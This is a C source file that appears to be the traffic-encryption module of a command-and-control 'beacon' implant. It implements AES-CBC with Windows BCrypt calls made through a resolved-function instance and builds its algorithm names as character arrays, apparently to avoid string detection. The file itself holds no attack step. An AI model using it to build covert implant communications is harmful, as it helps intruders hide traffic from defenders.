/* beacon/src/Core/Crypto.c
 * AES-128-CBC encrypt / decrypt via BCrypt, called through NAX_INSTANCE.
 * Encrypt: generates a random 16-byte IV, prepends it → IV || ciphertext.
 * Decrypt: first 16 bytes = IV, remainder = ciphertext → plaintext. */

#include "Macros.h"
#include "Instance.h"
#include "Crypto.h"
#include <bcrypt.h>

/* ========= [ encrypt: plaintext → IV || ciphertext ] ========= */

FUNC INT NaxEncrypt( PNAX_INSTANCE Nax,
                     const PBYTE plain, UINT32 plain_len,
                     PBYTE out, UINT32* out_len ) {
    /* Minimum output: IV(16) + padded ciphertext (next multiple of 16). */
    UINT32 pad_len = ( plain_len + NAX_AES_BLOCK ) & ~( NAX_AES_BLOCK - 1 );
    if ( *out_len < NAX_AES_IV + pad_len )
        return NAX_ERR_NOMEM;

    /* Generate a random IV directly into the output buffer. */
    if ( Nax->Bcrypt.BCryptGenRandom( NULL, out, NAX_AES_IV,
                                      BCRYPT_USE_SYSTEM_PREFERRED_RNG ) != 0 )
        return NAX_ERR_CRYPTO;

    /* Open AES-CBC provider. */
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    INT               rc   = NAX_ERR_CRYPTO;

    WCHAR aes_name[] = { 'A', 'E', 'S', '\0' };
    WCHAR cbc_mode[] = { 'C', 'h', 'a', 'i', 'n', 'i', 'n', 'g', 'M', 'o', 'd', 'e', '\0' };
    WCHAR cbc_val[]  = { 'C', 'h', 'a', 'i', 'n', 'i', 'n', 'g', 'M', 'o', 'd', 'e', 'C', 'B', 'C', '\0' };

    if ( Nax->Bcrypt.BCryptOpenAlgorithmProvider( &hAlg, aes_name, NULL, 0 ) != 0 )
        goto done;

    if ( Nax->Bcrypt.BCryptSetProperty( hAlg, cbc_mode,
                                        (PUCHAR)cbc_val,
                                        (ULONG)( 15 * sizeof( WCHAR ) ), 0 ) != 0 )
        goto done;

    if ( Nax->Bcrypt.BCryptGenerateSymmetricKey( hAlg, &hKey, NULL, 0,
                                                 Nax->Config.AesKey, NAX_AES_KEY, 0 ) != 0 )
        goto done;

    /* Copy IV so BCrypt can overwrite it in-place during encryption. */
    BYTE iv_copy[NAX_AES_IV];
    MmCopy( iv_copy, out, NAX_AES_IV );

    ULONG bytes_done = 0;
    if ( Nax->Bcrypt.BCryptEncrypt( hKey,
                                    plain, plain_len,
                                    NULL,
                                    iv_copy, NAX_AES_IV,
                                    out + NAX_AES_IV, pad_len,
                                    &bytes_done,
                                    BCRYPT_BLOCK_PADDING ) != 0 )
        goto done;

    *out_len = NAX_AES_IV + bytes_done;
    rc       = NAX_OK;

done:
    if ( hKey )
        Nax->Bcrypt.BCryptDestroyKey( hKey );
    if ( hAlg )
        Nax->Bcrypt.BCryptCloseAlgorithmProvider( hAlg, 0 );
    return rc;
}

/* ========= [ decrypt: IV || ciphertext → plaintext ] ========= */

FUNC INT NaxDecrypt( PNAX_INSTANCE Nax,
                     const PBYTE in, UINT32 in_len,
                     PBYTE plain, UINT32* plain_len ) {
    if ( in_len <= NAX_AES_IV )
        return NAX_ERR_WIRE;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    INT               rc   = NAX_ERR_CRYPTO;

    WCHAR aes_name[] = { 'A', 'E', 'S', '\0' };
    WCHAR cbc_mode[] = { 'C', 'h', 'a', 'i', 'n', 'i', 'n', 'g', 'M', 'o', 'd', 'e', '\0' };
    WCHAR cbc_val[]  = { 'C', 'h', 'a', 'i', 'n', 'i', 'n', 'g', 'M', 'o', 'd', 'e', 'C', 'B', 'C', '\0' };

    if ( Nax->Bcrypt.BCryptOpenAlgorithmProvider( &hAlg, aes_name, NULL, 0 ) != 0 )
        goto done;

    if ( Nax->Bcrypt.BCryptSetProperty( hAlg, cbc_mode,
                                        (PUCHAR)cbc_val,
                                        (ULONG)( 15 * sizeof( WCHAR ) ), 0 ) != 0 )
        goto done;

    if ( Nax->Bcrypt.BCryptGenerateSymmetricKey( hAlg, &hKey, NULL, 0,
                                                 Nax->Config.AesKey, NAX_AES_KEY, 0 ) != 0 )
        goto done;

    /* The first 16 bytes are the IV; the remainder is ciphertext. */
    BYTE iv_copy[NAX_AES_IV];
    MmCopy( iv_copy, in, NAX_AES_IV );

    ULONG bytes_done = 0;
    if ( Nax->Bcrypt.BCryptDecrypt( hKey,
                                    in + NAX_AES_IV, in_len - NAX_AES_IV,
                                    NULL,
                                    iv_copy, NAX_AES_IV,
                                    plain, *plain_len,
                                    &bytes_done,
                                    BCRYPT_BLOCK_PADDING ) != 0 )
        goto done;

    *plain_len = bytes_done;
    rc         = NAX_OK;

done:
    if ( hKey )
        Nax->Bcrypt.BCryptDestroyKey( hKey );
    if ( hAlg )
        Nax->Bcrypt.BCryptCloseAlgorithmProvider( hAlg, 0 );
    return rc;
}
